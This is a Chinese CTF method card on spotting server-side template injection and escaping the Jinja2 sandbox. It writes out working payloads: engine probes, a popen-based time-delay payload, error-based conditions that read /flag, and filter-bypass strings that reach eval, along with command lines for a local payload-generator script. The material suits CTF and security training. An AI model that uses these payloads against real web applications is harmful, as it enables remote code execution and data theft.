---
title: 方法卡 · SSTI 识别与 Jinja2 沙箱逃逸（含无回显盲注通道）
category: web
tags: [方法卡, ssti, jinja2, twig, 沙箱逃逸, 盲注, flask]
signals:
  - 提交 7*7 回显 49
  - 用户名欢迎语被渲染
  - 模板引擎报错
  - 输入 {{1/0}} 返回 500
  - 过滤了双花括号
  - 存在导出 PDF 或发邮件功能
  - TemplateRuntimeError
  - 输入被渲染到页面模板
difficulty: medium
source: kb/web/ssti-template-injection.md, kb/web/ssti-blind-and-sandbox-escape.md
tools: [python, 内置脚本, burpsuite]
updated: 2026-11-03
---

# 方法卡 · SSTI 识别与 Jinja2 沙箱逃逸（含无回显盲注通道）

## 适用场景

- 昵称、站点名、邮件模板、报告生成这类输入**被当模板源码渲染**；
- 提交 `{{7*7}}` 回显 `49`，或 `${7*7}`、`#{7*7}`、`<%= 7*7 %>` 回显 `49`；
- 报错页出现 `jinja2.exceptions`、`TemplateSyntaxError`、`Twig\Error`、`freemarker.template`；
- 更隐蔽的：`{{7*7}}` **没有 49 回显**，但 `{{1/0}}` 让页面变 500 —— 渲染发生了，只是输出被丢弃。

## 前置条件

- 有一处"输入 → 渲染"的回显点或可观测 oracle（状态码 / 延迟 / 带外）。
- 需要判断引擎族：`{{7*'7'}}` 得 `7777777` 是 Jinja2，得 `49` 是 Twig。
- Jinja2 逃逸需要模板全局里有 `lipsum`/`cycler`/`joiner`/`namespace`（Flask 预置）之一；
  纯 `SandboxedEnvironment` 下 `__globals__` 被封，改走 `request.environ` 或 `|attr` 拼串。
- 本卡脚本**只做离线 payload 生成与本地判定**，不发任何网络请求。

## 步骤

1. **探引擎**：把 `{{7*7}}`、`${7*7}`、`#{7*7}`、`<%= 7*7 %>`、`@(7*7)` 全试一遍，谁回 49 记下引擎族。
2. **定通道**：回显 → 直接读；`{{1/0}}` 能出 500 → 错误型盲注；
   全被吞就用 `{% if cond %}{{cycler...popen('sleep 5')}}{% endif %}` 时间型；都不行走 OOB。
3. **构条件**：错误型 `{% if open('/flag').read()[0]=='f' %}{{1/0}}{% endif %}`；
   没 `{% %}` 就 `{{(1/0) if cond else 0}}`（本卡脚本 `--style conditional` 生成这种）。
4. **过过滤**：`_` 被 ban → `|attr('\x5f\x5fclass\x5f\x5f')`；`.` 被 ban → `__getitem__`；
   `{{ }}` 被 ban → `{% print(7*7) %}`；`os` 被 ban → `__globals__['__bui'+'ltins__']['eval']`。
5. **逐字爆破**：字符集 `[a-z0-9_{}-]`，每字符一次请求；更长就二分 `read()[:n] < 'xxxx'`。

```powershell
# 本卡脚本：按引擎产出探测/逃逸 payload，并做回显判定（离线）
.\.venv\Scripts\python.exe kb/_methods/scripts/ssti_generic.py --engine jinja2 --payload probe
.\.venv\Scripts\python.exe kb/_methods/scripts/ssti_generic.py --engine jinja2 --payload escape --cmd 'cat /flag'
.\.venv\Scripts\python.exe kb/_methods/scripts/ssti_generic.py --engine jinja2 --payload blind --cond "open('/flag').read()[0]=='f'" --style conditional
.\.venv\Scripts\python.exe kb/_methods/scripts/ssti_generic.py --detect '{{7*7}} -> 49'
```

## 脚本

脚本路径：`kb/_methods/scripts/ssti_generic.py`（纯标准库，离线）

- 公开函数：`polymath_probes()`、`detect_engine(text)`、`build_probe(engine)`、`build_escape(engine, cmd)`、
  `build_blind(cond, style)`、`bypass_variants(expr)`、`sanitize_cmd(cmd)`。
- `--payload probe|escape|blind|bypass` 四类；`--engine jinja2|twig|freemarker|erb|razor`。
- `--detect`：喂进"回显文本"，按 `7777777`/`49`/`jinja2.exceptions` 等特征判引擎，不给假判。
- 命令必须是非交互白名单形态（`cat /flag`、`id`、`ls /`），带管道/分号/反引号直接拒绝。

## 失效场景

- **`{{7*7}}` 回显 49 但 RCE 全挂**：多半是 Twig（`{{7*'7'}}` 回 49），Jinja2 链整体不适用。
- **`__subclasses__()` 下标写死**：下标随 Python 版本与已加载模块变化，必须先打印再动态搜 `os._wrap_close`。
- **输出被缓存**：CDN/模板缓存会让你误判"无回显"，payload 里加随机 query 再试。
- **`{{1/0}}` 不出 500**：有全局 500 处理器统一返回同一页面，错误型 oracle 失效，转时间型或 OOB。
- **纯字符串匹配的假阳性**：页面把 `{{7*7}}` 原样回显（转义后）看起来像注入点，实际未渲染 —— 要验 `7*7` 是否被求值。

## 相关文档

- `kb/web/ssti-template-injection.md`（引擎判别矩阵、Jinja2 链、过滤绕过）
- `kb/web/ssti-blind-and-sandbox-escape.md`（三类盲注通道、沙箱逃逸与逐字爆破）
- `kb/_methods/ejs_prototype_pollution_rce.md`（Node/EJS 侧同源题）
- `kb/web/python-pickle-pyjail.md`（SSTI 与 pyjail 常同题出现）
